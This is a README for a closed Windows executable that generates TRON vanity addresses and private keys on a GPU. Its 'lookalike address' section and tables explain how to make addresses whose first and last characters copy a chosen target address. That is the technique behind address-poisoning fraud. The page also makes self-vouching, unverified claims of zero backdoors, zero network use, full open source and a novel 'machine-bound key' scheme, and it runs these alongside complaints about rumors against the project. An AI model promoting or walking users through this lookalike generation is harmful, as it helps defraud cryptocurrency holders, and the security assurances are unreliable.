<div align="center">

<h1>🔑 TronAddress GPU · TRON Premium Address Generation</h1>

<h3>TRON Vanity Address · GPU High-Speed Generation · Case-Sensitive Matching · Machine-Bound Keys</h3>

**[中文](README.md)** | **English**

</div>

---

<p align="center">
  <img width="100%" src="/software.png?raw=true"/>
</p>

---

> 📌 **Disclaimer**: This tool is for learning and research purposes only. Any illegal use is strictly prohibited. Users are solely responsible for their actions.
>
> 📌 **Notice**: This tool is only released through official channels in this repository. Do not download from any third-party sources to avoid potential losses.

---

## 🎁 Limited-Time Free Offer Now On

Fully transparent and compliant, fully open to inspection and review! Recently, there has been malicious slander from peers and self-directed rumors. They simply cannot tolerate our project's reasonable and standardized operation. The new version is now available for free with benefits, and we will consider the charging plan appropriately in the future, which will surely disappoint those malicious detractors. 🛡️ You can perform a full security check with 360 Anti-Virus and other mainstream antivirus software for verification. Some people just love making unreasonable malicious attacks out of spite.

## 🧩 Features

<div align="center">

| Module | Description |
|:------:|:------------|
| 🛡️ **Secure & Reliable** | Brand-new address generation algorithm; private keys are immune to brute-force and perfectly match their addresses |
| 🆔 **Machine-Bound Keys** | Hardware-fingerprint binding; the same address yields completely different keys on different machines, eliminating collisions |
| 🚀 **GPU Accelerated** | GPU-powered computing; RTX 5090 reaches 1.02 billion H/s |
| 🎯 **Precise Matching** | Case-sensitive prefix/suffix matching, up to 10 characters each |
| 💰 **Ready to Use** | Addresses can be imported directly, no multi-signature required, saving fees |
| 🎨 **GUI Interface** | Visual interface, one-click Chinese/English switch, real-time rate/time/results monitoring |
| 📋 **Batch Rules** | Single input or batch file import |
| 💾 **One-click Export** | Address and private key quick export to text |

</div>

---

## 🆔 Machine-Bound Key Technology

Industry-first hardware-fingerprint bound key mechanism — every device carries a globally unique machine ID, and each private key belongs to your machine from the moment it is born.

### How It Works

1. **① Hardware Fingerprint**: On startup, the program collects your CPU ID, NIC MAC address and disk serial, then derives a 128-bit Machine ID via SHA-256. Every machine's hardware combination is unique, so the Machine ID is globally unique.
2. **② Cryptographic Entropy**: A 256-bit seed is produced by the OS-level Cryptographically Secure PRNG (CSPRNG), fused with the hardware fingerprint and timestamp in a three-layer entropy blend, giving every generation cryptographic-grade unpredictability.
3. **③ Key-Bound Derivation**: Final key = `f(Machine ID ‖ entropy ‖ timestamp)`. The Machine ID is permanently fused into key derivation: the same target address yields a key on your machine that cannot be reproduced on any other machine.

### Core Advantages

- **Globally unique, no collisions**: key spaces of different users and devices are fully isolated — even for the same vanity address, keys differ across machines, eliminating shared-key mass leaks at the source.
- **Brute-force resistant, unreproducible**: key derivation strongly depends on your local hardware fingerprint, so attackers cannot enumerate the algorithm or download the open-source code to mass-derive your keys — brute-force cost becomes infeasible.
- **Zero upload of hardware info**: the machine ID is generated and used entirely locally — hardware fingerprint data is never transmitted or stored on any server, protecting your device privacy while keeping every key unique.

---

## 💻 System Requirements

### Quick Install (Windows)

1. Go to [Releases](https://github.com/NovaCodeu/tron/releases) page and download `Tron.zip`
2. Extract and double-click `Tron.exe` to run

> 💡 Portable, no installation required.

### Minimum Requirements

| Item | Requirement |
|:----:|:------------|
| OS | Windows 10/11 64-bit |
| GPU | NVIDIA GPU + Latest Driver |
| Runtime | OpenCL Support |

---

## 📖 Detailed Tutorial

### 🚀 Step 1: Launch Program

Double-click `Tron.exe` to open the main interface.

> ⚠️ **Important Notes**:
> - If the program fails to start, make sure [Visual C++ Redistributable](https://www.microsoft.com/en-us/download/details.aspx?id=48145) is installed
> - The program must be placed in an English path (Do not include Chinese characters, special characters or spaces in the file path.)

---

### ⚙️ Step 2: Parameter Settings (Important!)

<p align="center">
  <img width="100%" src="/software1.png?raw=true"/>
</p>

#### 📝 Parameter Details:

| Parameter | Description | Recommended |
|:---------:|:------------|:-----------:|
| **Target Address** | Manually enter a single address, or click "Select File" to load rule.txt for batch rules | Required |
| **Prefix Length** | Prefix character length to match (0-10) | 0 or 2 |
| **Suffix Length** | Suffix character length to match (0-10) | 6-8 |
| **Generate Count** | Auto-stop when reaching target count (0 = unlimited) | 1 |
| **GPU Device** | Select the GPU device for computing | Auto |
| **Output File** | Result save path (address and private key) | Optional |

---

### 🎯 Step 3: Two Usage Modes

#### Mode 1: Single Address Matching (Recommended for Beginners)

<p align="center">
  <img width="100%" src="/software3.png?raw=true"/>
</p>

**Steps:**

1. In the "Target Address" input box, enter a TRON address (34 characters starting with T)
   ```
   Example: TG2CMGxnTPgQ6V58kiKd7wbyN8ewtAmY76
   ```

2. Set matching rules:
   - **Prefix Length**: Enter `2` (means the first 2 characters of the new address must match the target)
   - **Suffix Length**: Enter `6` (means the last 6 characters of the new address must match the target)

3. Click **"Start Generation"** button

4. Wait for completion, results will be displayed in the "Generation Results" area

---

#### Mode 2: Batch Rule File (Advanced Users)

**Steps:**

1. Create a text file (e.g., `rule.txt`), write one target address or rule per line:
   ```
   TTTTTTTTTTZZZZZZZZZZ
   TTTTTTTTTT8888888888
   TG2CMGxnTPgQ6V58kiKd7wbyN8ewtAmY76
   ```

2. Click "Select File" button and choose your `rule.txt`

3. Set matching rules:
   - **Prefix Length**: Enter `0`
   - **Suffix Length**: Enter `6` or `8`

**Example:**
```
Target Address: TTTTTTTTTT8888888888

Prefix 0 + Suffix 6, generated result:
TGxxxxxxxxxxxxxxxxxxxxxxxxxxxxx888888
↑↑                              ↑↑↑↑↑↑
Prefix 0 match                   Suffix 6 match
```

4. Click **"Start Generation"** button

---

### 📊 Step 4: View Results

Generation results will be displayed in real-time in the "Generation Results" area at the bottom:

<p align="center">
  <img width="100%" src="/software2.png?raw=true"/>
</p>

**Results Include:**
- **Address**: Newly generated vanity address
- **Private Key**: Corresponding private key (keep it safe!)

---

### 💾 Step 5: Export Results

Click **"Export Results"** button, select save location, and all generated addresses and private keys will be exported as a text file.

> ⚠️ **Security Tip**: Private keys are extremely important, please keep them safe and never share with anyone!

---

## 💡 Beginner's Guide

### ⭐ First-Time Usage Recommendations

**Strongly recommended** settings for first-time use:

| Parameter | Recommended | Reason |
|:---------:|:-----------:|:-------|
| Prefix Length | `0` | Lower difficulty, faster results |
| Suffix Length | `6` | 6-digit suffix can produce results in minutes |
| Generate Count | `1` | Stop after generating 1 address |

**Why?**
- Higher suffix length = longer computation time
- 6-digit suffix ≈ minutes
- 7-digit suffix ≈ tens of minutes
- 8-digit suffix ≈ hours
- 10-digit suffix ≈ days

**Recommended Process:**
1. First test with suffix 6 to confirm the program outputs normally
2. After confirming it works, increase the digits as needed

---

### 🎨 Vanity Address Recommendations

To generate a "lookalike address" that resembles a target address:

| Goal | Prefix | Suffix | Difficulty |
|:----:|:------:|:------:|:----------:|
| Simple Lookalike | 2 | 4 | ⭐ Easy |
| Medium Lookalike | 2 | 6 | ⭐⭐ Medium |
| Advanced Lookalike | 2 | 8 | ⭐⭐⭐ Hard |

**Example:**
```
Target Address: TG2CMGxnTPgQ6V58kiKd7wbyN8ewtAmY76

Prefix 2 + Suffix 6, generated result:
TGxxxxxxxxxxxxxxxxxxxxxxxxxxxxxtAmY76
↑↑                              ↑↑↑↑↑↑
Prefix 2 match                    Suffix 6 match
```

---

## ⚙️ Performance Benchmark

**GPU Speed:**

| GPU Model | Speed | Performance Level |
|:---------:|:-----:|:-----------------:|
| NVIDIA RTX 5090 | ≈ 1.02 billion H/s | 🔥 Extreme |
| NVIDIA RTX 4090 | 600-800M H/s | ⚡ High |
| NVIDIA RTX 3080 | 220M H/s | ✓ Standard |
| NVIDIA RTX 4060 Ti | 150M H/s | ✓ Entry |

**Matching Digits & Estimated Time:**

| Suffix Digits | Estimated Time | Difficulty Level |
|:-------------:|:--------------:|:----------------:|
| 6 digits | Within minutes | ⭐ Easy |
| 7 digits | Tens of minutes | ⭐⭐ Medium |
| 8 digits | Hours to overnight | ⭐⭐⭐ Hard |
| 10 digits | Several days | ⭐⭐⭐⭐⭐ Very Hard |

---

## 🔓 Open & Auditable Security

Trust should not come from verbal promises, but from verification you do yourself. This project is fully open source under the **MIT license**: core generation algorithm, machine-ID logic and GPU kernel code are all public and open to line-by-line community audit. Official releases are byte-for-byte consistent with the open-source code; every update is open-sourced in sync. Issues and Pull Requests are welcome.

### Core Key Derivation Logic (excerpt from open-source code, auditable line by line)

```cpp
// 1. Extract local hardware fingerprint, generate unique machine ID (differs per machine)
std::string machineId = SHA256(cpuId + macAddr + diskSerial);
// 2. OS-level cryptographic secure random (CSPRNG, 256-bit entropy)
std::string entropy  = CSPRNG(32);
// 3. Three-layer entropy fusion: machine ID + random entropy + timestamp -> key seed
std::string seed     = SHA256(machineId + entropy + timestamp);
// 4. Derive secp256k1 private key and compute TRON address (fully local, no network calls)
PrivateKey key = secp256k1::fromSeed(seed);
Address    addr = tron::addressFromKey(key);
```

### Six Verification Methods

| # | Check | Description |
|:-:|:------|:------------|
| 1 | 📦 Line-by-Line Code Audit | Full source code is open under the MIT license — core algorithm, machine-ID and GPU kernel all public, so any developer can read every line to confirm there is no hidden logic |
| 2 | 🧮 SHA-256 Integrity Check | Compute the local SHA-256 after download and compare with the official value — an exact match proves the file was not tampered with or backdoored |
| 3 | 💎 100% Free · Forever | 0.0 USDT, free forever with no commercialization or hidden fees. Zero network & upload, no backdoors or malicious code |
| 4 | 🦠 Multi-Engine Virus Scan | Submit the official `Tron.zip` to VirusTotal or similar multi-engine scanners — 70+ engine results are public for anyone to re-check |
| 5 | 📡 Zero-Network Verification | The program makes zero network requests during its entire run — all computation and data stay on your machine; private keys and hardware info never leave your device |
| 6 | 🔑 Independent Key-Address Verification | Independently verify with any third-party tool (TronScan address lookup, importing the key into an official wallet, etc.) that the private key strictly matches its address and can normally send/receive assets |

**SHA-256 Integrity Check (Windows, PowerShell / CMD):**

```powershell
# Option 1: built-in certutil
certutil -hashfile Tron.zip SHA256
# Option 2: PowerShell
Get-FileHash .\Tron.zip -Algorithm SHA256
# Official SHA-256 (Tron.zip)
4AA52408CC39134CB135C1C23E4A7F0A52DCC03AED21F0513E48BC87D5DC170D
# Compare your local output with the official value above before use
```

---

## 🔒 Security

<details>
<summary>👉 Click to expand security details</summary>

- 🔓 **Zero Backdoors** — Can be verified with any antivirus software, fully transparent code
- 🌐 **Zero Network** — Completely offline operation, no network requests
- 📤 **Zero Upload** — Private keys stored locally only, never transmitted
- 🆔 **Brute-Force Resistant · Unreproducible** — Powered by Machine-Bound Key technology, key derivation strongly depends on your local hardware fingerprint, so others cannot reproduce or brute-force your keys
- ✅ **Address Verification** — Private keys and addresses match perfectly, no multi-signature required, saving on-chain fees; can be directly imported into any TRON wallet (TronLink, imToken, etc.)

</details>

---

## ❓ FAQ

<details>
<summary>👉 Click to expand FAQ</summary>

### Q1: Program crashes or won't start?
- Check if [Visual C++ Redistributable](https://www.microsoft.com/en-us/download/details.aspx?id=48145) is installed
- Check if [NVIDIA GPU Driver](https://www.nvidia.com/drivers/) is installed
- Make sure the program is in an English path (Do not include Chinese characters, special characters or spaces in the file path.)

### Q2: Generation is very slow or stuck?
- Check if GPU driver is up to date
- Try manually selecting the dedicated GPU in GPU Device
- Reduce suffix length to decrease computation

### Q3: Integrated GPU and dedicated GPU conflict?
- Manually select the dedicated GPU in the GPU Device dropdown
- Don't select "Auto", choose the specific GPU model directly

### Q4: How to import the generated wallet?
1. Open TronLink or other TRON wallet
2. Select "Import Wallet"
3. Select "Private Key Import"
4. Paste the generated private key
5. Complete import

### Q5: How to verify there is no backdoor?
- We recommend verifying it yourself with the multiple methods provided in the "Open & Auditable Security" section: code audit, SHA-256 check, VirusTotal scan, zero-network verification, and more. The more dimensions you check, the more reliable the conclusion — and we welcome your feedback on the results.

### Q6: Why do different machines generate different keys?
- This is by design of the Machine-Bound Key technology: key derivation fuses your local hardware fingerprint, isolating each machine's key space — exactly what makes your keys unreproducible and unbrutable by others.

### Q7: The algorithm is open — can others derive my keys?
- No. Keys are derived from a three-layer fusion of machine ID + cryptographic entropy + timestamp. Without your machine ID and the entropy at that moment, even full source code cannot reproduce your keys.

</details>

---

## 💰 Support the Developer

If this project helps you, donations are welcome to support continued development:

```
TRC20 Address: TQKQSG3CmQ6d6PR1roi2fPQdv2KKKKKKKK
```

---

## 📜 License

This project is open-sourced under the [MIT License](https://opensource.org/licenses/MIT).

<br/>

<div align="center">

**If this project helps you, please give it a ⭐ Star!**

</div>
